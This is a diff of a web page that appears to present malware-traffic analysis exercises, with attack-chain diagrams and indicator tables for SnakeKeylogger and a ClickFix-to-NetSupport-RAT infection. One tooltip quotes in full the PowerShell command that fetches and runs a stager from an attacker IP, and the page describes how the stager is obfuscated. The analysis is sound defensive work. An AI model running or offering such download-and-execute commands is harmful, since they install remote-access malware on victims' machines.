-        <g class="chain-node" onmouseenter="showTip(event,'C2 Communication — Telegram Bot API','Domain: api.telegram.org\nIP: 149.154.166.110\nProtocol: TLSv1.3 (port 443) — encrypted\nVT Crowdsourced: HIGH — SNAKEKEYLOGGER\nSource: Cluster25\nThis domain is used as CnC by SNAKEKEYLOGGER\nTechnique: C2 over legitimate messaging platform\nAdvantage: Telegram whitelisted on most firewalls\nContent: not visible — fully encrypted')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="283" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="283" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="305" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">api.telegram.org — C2 Channel</text>
-          <text x="24" y="323" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">TLSv1.3 — SNAKEKEYLOGGER Telegram Bot C2</text>
-          <text x="24" y="339" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">VT: HIGH — Cluster25 confirmed</text>
+        <line x1="160" y1="234" x2="160" y2="262" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'Geo-Reconnaissance','checkip.dyndns.org ×3 + reallyfreegeoip.org\nPublic IP + city + region + country')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="265" width="300" height="54" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="265" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="287" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Geo-Reconnaissance</text>
+          <text x="24" y="305" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">checkip.dyndns.org + reallyfreegeoip.org</text>
         </g>
-        <line x1="160" y1="349" x2="160" y2="377" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
-        <text x="168" y="367" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">1:36 min →</text>
-        <text x="308" y="380" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">03:04:55Z</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Geographic Reconnaissance','checkip.dyndns.org (193.122.130.0)\n  HTTP GET / — queried 3 times\n  Purpose: get victim public IP address\nreallyfreegeoip.org (104.21.67.152)\n  TLSv1 port 443 — Cloudflare CDN\n  Bytes B→A = 5 kB (JSON geo-response only)\n  VT: EXPIRO C2 conflict — PCAP shows Geo-Recon\nPurpose: identify victim city, region, country\nbefore triggering spam bot activity')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="382" width="300" height="80" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="382" width="4" height="80" rx="2" fill="#ff4757"/>
-          <text x="24" y="404" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Geo-Reconnaissance</text>
-          <text x="24" y="422" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">checkip.dyndns.org ×3 + reallyfreegeoip.org</text>
-          <text x="24" y="438" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Public IP lookup + geographic profiling</text>
-          <text x="24" y="454" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">reallyfreegeoip.org: VT EXPIRO conflict noted</text>
+        <line x1="160" y1="319" x2="160" y2="347" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'Spam Bot SMTP','cphost14.qhoster.net — 78.110.166.82\nEHLO → STARTTLS → bulk spam\nVT: PHISHING+BACKDOOR #C2')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="350" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
+          <rect x="10" y="350" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="372" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">cphost14.qhoster.net — Spam Bot</text>
+          <text x="24" y="390" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">EHLO → STARTTLS → bulk spam sent</text>
+          <text x="24" y="406" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Public IP 173.166.146.112 exposed</text>
         </g>
-        <line x1="160" y1="462" x2="160" y2="490" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar9)"/>
-        <text x="168" y="480" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">9 sec →</text>
-        <text x="308" y="493" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">03:05:04Z</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Spam Bot — SMTP Activity','Server: cphost14.qhoster.net\nIP: 78.110.166.82 (UK Dedicated Servers — AS42831)\nVT: PHISHING+BACKDOOR #C2 — known malicious\nPort: 587 — victim initiated connection\nSMTP Handshake:\n  S: 220 cphost14.qhoster.net (ready)\n  C: EHLO DESKTOP-WIN11PC (victim identifies)\n  S: 250 Hello [173.166.146.112] (public IP exposed!)\n  C: STARTTLS (requests encryption)\n  S: 220 TLS go ahead → content now hidden\nUpgraded to TLSv1.2 — bulk spam emails sent\nPublic IP 173.166.146.112 abused as spam source')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="495" width="300" height="92" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
-          <rect x="10" y="495" width="4" height="92" rx="2" fill="#ff4757"/>
-          <text x="24" y="517" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">cphost14.qhoster.net — Spam Bot SMTP</text>
-          <text x="24" y="535" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">78.110.166.82:587 — EHLO → STARTTLS → TLS</text>
-          <text x="24" y="551" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Victim converted to spam bot (without knowledge)</text>
-          <text x="24" y="567" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Public IP 173.166.146.112 exposed in banner</text>
-          <text x="24" y="579" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">VT: PHISHING+BACKDOOR #C2 confirmed</text>
+        <text x="160" y="462" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
+      </svg>
+    </div>
+  </div>
+
+  <!-- EX10 PANEL — ClickFix to NetSupport RAT -->
+  <div class="chain-panel" id="chain-ex10">
+    <div class="chain-info fade-in">
+      <h3>ClickFix to NetSupport RAT</h3>
+      <p>Multi-stage ClickFix attack on an AD environment. Victim was lured via Google Sites to a fake CAPTCHA page that displayed Fake UI elements and tricked them into manually executing a PowerShell stager. NetSupport RAT deployed fileless via IEX — followed by persistent C2 beaconing and a lateral movement attempt against the Domain Controller.</p>
+      <div class="chain-meta-grid">
+        <div class="chain-meta-item"><div class="chain-meta-label">INFECTED HOST</div><div class="chain-meta-val">10.12.29.101</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">HOSTNAME</div><div class="chain-meta-val">DESKTOP-7P1B4E8</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">MALWARE</div><div class="chain-meta-val">NetSupport RAT</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">C2 SERVER</div><div class="chain-meta-val">185.39.19.96</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">DOMAIN</div><div class="chain-meta-val">techbros.tech</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">TECHNIQUE</div><div class="chain-meta-val">ClickFix + Fileless</div></div>
+      </div>
+    </div>
+    <div class="chain-svg-wrap fade-in">
+      <svg width="100%" viewBox="0 0 320 820" style="max-height:870px">
+        <defs>
+          <marker id="am10" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#253548" stroke-width="1.5" stroke-linecap="round"/></marker>
+          <marker id="ar10" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
+          <marker id="ao10" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ffa502" stroke-width="1.5" stroke-linecap="round"/></marker>
+        </defs>
+        <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:01:01</text>
+        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.12.29.101\nHostname: DESKTOP-7P1B4E8\nOS: Windows\nDomain: techbros.tech\nDC: 10.12.29.2 — WIN-5AL1VAY4TC3')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
+          <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
+          <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">DESKTOP-7P1B4E8</text>
+          <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.12.29.101 | techbros.tech (AD)</text>
         </g>
-        <text x="160" y="618" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e" text-anchor="middle">── sandbox evasion → Telegram C2 → geo-recon → spam bot ──</text>
-        <rect x="10" y="630" width="10" height="10" fill="#4a5568" rx="1"/><text x="26" y="639" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Victim</text>
-        <rect x="80" y="630" width="10" height="10" fill="#253548" rx="1" stroke="#8b949e" stroke-width="1" stroke-dasharray="2 2"/><text x="96" y="639" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Unknown vector</text>
-        <rect x="200" y="630" width="10" height="10" fill="#ff4757" rx="1"/><text x="216" y="639" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">C2 / Spam Bot</text>
-        <text x="160" y="658" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
+        <line x1="160" y1="64" x2="160" y2="92" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ao10)"/>
+        <text x="168" y="82" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ffa502">visits lure page</text>
+        <text x="308" y="97" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:01:01</text>
+        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection — Google Sites Lure','Domain: sites.google.com\nProtocol: HTTPS — legitimate Google infrastructure\nPage: Fake Samsung S22 PDF (samsung-s22)\nFile: eStatement_12_2025.pdf (fake)\nTechnique: Abuse of Google Sites to bypass filters\nAction: displays fake CAPTCHA — triggers redirect\nNote: Not visible as malicious in PCAP (whitelisted)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="99" width="300" height="66" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
+          <rect x="10" y="99" width="4" height="66" rx="2" fill="#ffa502"/>
+          <text x="24" y="121" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">sites.google.com — Lure Page</text>
+          <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">Fake Samsung PDF — abuses Google infra</text>
+          <text x="24" y="155" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Not observable as malicious in PCAP</text>
+        </g>
+        <line x1="160" y1="165" x2="160" y2="193" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ao10)"/>
+        <text x="168" y="183" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ffa502">302 redirect — auto</text>
+        <text x="308" y="196" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:01:32</text>
+        <g class="chain-node" onmouseenter="showTip(event,'TDS — Traffic Distribution System','Domain: ivanstonework.com\nIP: 65.181.111.158 (WHG Hosting — AS14670)\nProtocol: HTTPS (TLSv1.3) port 443\nRole: 302 Redirect / TDS — routes victim to ClickFix page\nVT: 2/94 Malicious (ADMINUSLabs + Fortinet)\nTiming: 0.72s after Google Sites = auto redirect\nNot Initial Infection — acts as intermediary only')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="198" width="300" height="66" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
+          <rect x="10" y="198" width="4" height="66" rx="2" fill="#ffa502"/>
+          <text x="24" y="220" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">ivanstonework.com — 302 TDS</text>
+          <text x="24" y="238" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">65.181.111.158 — routes to ClickFix page</text>
+          <text x="24" y="254" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">VT: 2/94 malicious — intermediary redirect</text>
+        </g>
+        <line x1="160" y1="264" x2="160" y2="292" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar10)"/>
+        <text x="168" y="282" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">0.72s — auto</text>
+        <text x="308" y="295" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:01:33</text>
+        <g class="chain-node" onmouseenter="showTip(event,'ClickFix CAPTCHA Page','Domain: extracareliving.com\nIP: 45.93.20.50 (GTHost — AS63023)\nProtocol: HTTPS (TLSv1.3) port 443\nPage title: Checking if you are human\nAction: Fake Cloudflare CAPTCHA page\nInstruction: Win+R → paste PowerShell cmd\nPayload shown: powershell -wi mi -EP B -c iex(irm 80.253.249.145/wwww.txt)\nThreatFox: payload_delivery — 100% confidence\nFake UI elements: i.postimg.cc + i.ibb.co fetched automatically')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="297" width="300" height="80" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="297" width="4" height="80" rx="2" fill="#ff4757"/>
+          <text x="24" y="319" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">extracareliving.com — ClickFix Page</text>
+          <text x="24" y="337" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">45.93.20.50 — fake CAPTCHA (Cloudflare style)</text>
+          <text x="24" y="353" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Victim: Win+R → paste cmd → press Enter</text>
+          <text x="24" y="369" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">i.postimg.cc + i.ibb.co = Fake UI elements</text>
+        </g>
+        <line x1="160" y1="377" x2="160" y2="402" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar10)"/>
+        <text x="120" y="393" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">~40 sec human gap</text>
+        <text x="308" y="405" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:02:13</text>
+        <g class="chain-node" onmouseenter="showTip(event,'PowerShell Stager — wwww.txt','Server: 80.253.249.145 (Apache/2.4.58 Ubuntu)\nEndpoint: GET /wwww.txt\nUser-Agent: WindowsPowerShell/5.1.26100.7462\nContent-Length: 499 bytes\nContent-Type: text/plain\nPurpose: Stage 1 — builds URL + fetches payload\nKey code: $url = http + :// + 80.253.249 + .145/F + .GRE\nExecution: IEX($h.ResponseText) — fileless\nObfuscation: URL split into parts to evade AV')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="407" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="407" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="429" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">80.253.249.145 — PowerShell Stager</text>
+          <text x="24" y="447" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">GET /wwww.txt — 499 bytes stager script</text>
+          <text x="24" y="463" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">IEX — fileless execution, URL obfuscated</text>
+        </g>
+        <line x1="160" y1="473" x2="160" y2="498" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar10)"/>
+        <text x="168" y="489" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">1 sec →</text>
+        <text x="308" y="501" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:02:14</text>
+        <g class="chain-node" onmouseenter="showTip(event,'NetSupport RAT Payload — F.GRE','Server: 80.253.249.145\nEndpoint: GET /F.GRE\nUser-Agent: MSIE 7.0 on Windows NT 10.0 (FAKE!)\nContent-Type: application/vnd.geometry-explorer\nContent-Length: 13,422,846 bytes (~13 MB)\nContent: Heavily obfuscated PowerShell\nExecution: IEX in-memory — Fileless\nPayload: NetSupport RAT\nAnti-AV: MSIE 7.0 impossible on Win10 = spoofed')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="503" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="503" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="525" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">80.253.249.145 — NetSupport RAT Payload</text>
+          <text x="24" y="543" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">GET /F.GRE — 13 MB obfuscated PowerShell</text>
+          <text x="24" y="559" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Fake MSIE 7.0 UA — Fileless IEX execution</text>
+        </g>
+        <line x1="160" y1="569" x2="160" y2="594" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar10)"/>
+        <text x="168" y="585" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">8 sec →</text>
+        <text x="308" y="597" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:02:22</text>
+        <g class="chain-node" onmouseenter="showTip(event,'C2 Attempt — Failed (Cloudflare)','IP: 104.21.96.46 (Cloudflare — CDN)\nDomain: relativegoingplanning.net\nEndpoint: POST /fakeurl.htm\nResult: HTTP 400 Bad Request\nReason: Plain HTTP sent to HTTPS port via Cloudflare\nError: The plain HTTP request was sent to HTTPS port\nConclusion: Attacker misconfiguration — C2 unreachable via CDN')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="599" width="300" height="66" rx="4" fill="#111820" stroke="#253548" stroke-width="1" stroke-dasharray="4 3"/>
+          <rect x="10" y="599" width="4" height="66" rx="2" fill="#4a5568"/>
+          <text x="24" y="621" font-family="'JetBrains Mono',monospace" font-size="11" fill="#8b949e" font-weight="500">104.21.96.46 — C2 Attempt FAILED</text>
+          <text x="24" y="639" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">relativegoingplanning.net — HTTP 400</text>
+          <text x="24" y="655" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Cloudflare rejected plain HTTP on HTTPS port</text>
+        </g>
+        <line x1="160" y1="665" x2="160" y2="690" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar10)"/>
+        <text x="168" y="681" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">1 sec →</text>
+        <text x="308" y="693" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:02:23+</text>
+        <g class="chain-node" onmouseenter="showTip(event,'C2 Active — NetSupport RAT Beaconing','IP: 185.39.19.96 (port 443)\nEndpoint: POST /fakeurl.htm (HTTP over port 443)\nUser-Agent: NetSupport Manager/1.3\nContent-Type: application/x-www-form-urlencoded\nServer: NetSupport Gateway/1.92 (Windows NT)\nCMD=POLL: host checks in for new commands\nCMD=ENCD: C2 sends encoded commands back\nDATA: encoded — content not readable\nLateral Movement attempt: SMB to DC 10.12.29.2 (lsarpc)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="695" width="300" height="80" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
+          <rect x="10" y="695" width="4" height="80" rx="2" fill="#ff4757"/>
+          <text x="24" y="717" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">185.39.19.96 — C2 Active Beaconing</text>
+          <text x="24" y="735" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">POST /fakeurl.htm — CMD=POLL / CMD=ENCD</text>
+          <text x="24" y="751" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">NetSupport Manager/1.3 — full RAT control</text>
+          <text x="24" y="767" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">SMB lsarpc → DC 10.12.29.2 (lat. movement)</text>
+        </g>
+        <text x="160" y="796" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e" text-anchor="middle">── Google Sites lure → ClickFix → NetSupport RAT → C2 ──</text>
+        <rect x="10" y="806" width="10" height="10" fill="#4a5568" rx="1"/><text x="26" y="815" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Victim</text>
+        <rect x="80" y="806" width="10" height="10" fill="#ffa502" rx="1"/><text x="96" y="815" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Social Eng.</text>
+        <rect x="170" y="806" width="10" height="10" fill="#ff4757" rx="1"/><text x="186" y="815" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">C2 / Payload</text>
+        <text x="160" y="832" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
       </svg>
     </div>
   </div>
@@ -808,6 +795,7 @@ html,body{max-width:100%;overflow-x:hidden;}
     <div class="ioc-filter" onclick="filterIOC('2026-02-03',this)">2026-02-03</div>
     <div class="ioc-filter" onclick="filterIOC('2026-02-02',this)">2026-02-02</div>
     <div class="ioc-filter" onclick="filterIOC('2026-01-29',this)">2026-01-29</div>
+    <div class="ioc-filter" onclick="filterIOC('2025-12-29',this)">2025-12-29</div>
   </div>
   <table class="ioc-table">
     <thead><tr><th>INDICATOR</th><th>TYPE</th><th>ROLE</th><th>EXERCISE</th></tr></thead>
@@ -847,7 +835,6 @@ html,body{max-width:100%;overflow-x:hidden;}
       <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">132.226.8.169</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Oracle Cloud IP hosting checkip.dyndns.org</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
       <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">ipinfo.io</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Geo-Reconnaissance — city + region + country profiling of victim</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
       <tr data-ex="2026-02-02"><td class="ioc-val" data-label="INDICATOR">34.117.59.81</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Google Cloud IP hosting ipinfo.io — Geo-Reconnaissance</td><td class="ioc-ex" data-label="EXERCISE">2026-02-02</td></tr>
-      <!-- 2026-01-29 Silent Spammer IOCs -->
       <tr data-ex="2026-01-29"><td class="ioc-val" data-label="INDICATOR">api.telegram.org</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">C2 Channel — SNAKEKEYLOGGER Telegram Bot API (VT: HIGH — Cluster25)</td><td class="ioc-ex" data-label="EXERCISE">2026-01-29</td></tr>
       <tr data-ex="2026-01-29"><td class="ioc-val" data-label="INDICATOR">149.154.166.110</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">Telegram C2 hosting IP — SNAKEKEYLOGGER beacon target</td><td class="ioc-ex" data-label="EXERCISE">2026-01-29</td></tr>
       <tr data-ex="2026-01-29"><td class="ioc-val" data-label="INDICATOR">ip-api.com</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Sandbox Evasion — GET /json/ → hosting=false (T1497)</td><td class="ioc-ex" data-label="EXERCISE">2026-01-29</td></tr>
@@ -858,6 +845,21 @@ html,body{max-width:100%;overflow-x:hidden;}
       <tr data-ex="2026-01-29"><td class="ioc-val" data-label="INDICATOR">104.21.67.152</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Cloudflare CDN IP for reallyfreegeoip.org — block domain only</td><td class="ioc-ex" data-label="EXERCISE">2026-01-29</td></tr>
       <tr data-ex="2026-01-29"><td class="ioc-val" data-label="INDICATOR">cphost14.qhoster.net</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">SMTP Spam Bot server — victim used to send bulk malicious email</td><td class="ioc-ex" data-label="EXERCISE">2026-01-29</td></tr>
       <tr data-ex="2026-01-29"><td class="ioc-val" data-label="INDICATOR">78.110.166.82</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">UK Dedicated Servers (AS42831) — SMTP C2 / VT: PHISHING+BACKDOOR</td><td class="ioc-ex" data-label="EXERCISE">2026-01-29</td></tr>
+      <!-- 2025-12-29 ClickFix to NetSupport RAT IOCs -->
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">ivanstonework.com</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">TDS / 302 Redirect — routes victim from Google Sites to ClickFix page</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">65.181.111.158</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">WHG Hosting (AS14670) — ivanstonework.com TDS server IP</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">extracareliving.com</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">ClickFix fake CAPTCHA page — tricks victim into executing PowerShell stager</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">45.93.20.50</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">GTHost (AS63023) — extracareliving.com ClickFix server IP</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">i.postimg.cc</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Fake UI element — image fetched automatically to render ClickFix CAPTCHA page</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">i.ibb.co</td><td data-label="TYPE"><span class="ex-badge badge-high">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">Fake UI element — image fetched automatically to render ClickFix CAPTCHA page</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">80.253.249.145</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">Stager + Payload server — hosts /wwww.txt and /F.GRE (Apache/2.4.58 Ubuntu)</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">80.253.249.145/wwww.txt</td><td data-label="TYPE"><span class="ex-badge badge-critical">URL</span></td><td class="ioc-role" data-label="ROLE">PowerShell Stager — 499 bytes, fetches F.GRE payload via IEX (fileless)</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">80.253.249.145/F.GRE</td><td data-label="TYPE"><span class="ex-badge badge-critical">URL</span></td><td class="ioc-role" data-label="ROLE">NetSupport RAT payload — 13 MB obfuscated PowerShell, executed fileless via IEX</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">relativegoingplanning.net</td><td data-label="TYPE"><span class="ex-badge badge-critical">DOMAIN</span></td><td class="ioc-role" data-label="ROLE">NetSupport RAT C2 domain — resolved to both Cloudflare and 185.39.19.96</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">185.39.19.96</td><td data-label="TYPE"><span class="ex-badge badge-critical">IP</span></td><td class="ioc-role" data-label="ROLE">C2 Server — NetSupport RAT beaconing POST /fakeurl.htm (CMD=POLL/ENCD)</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
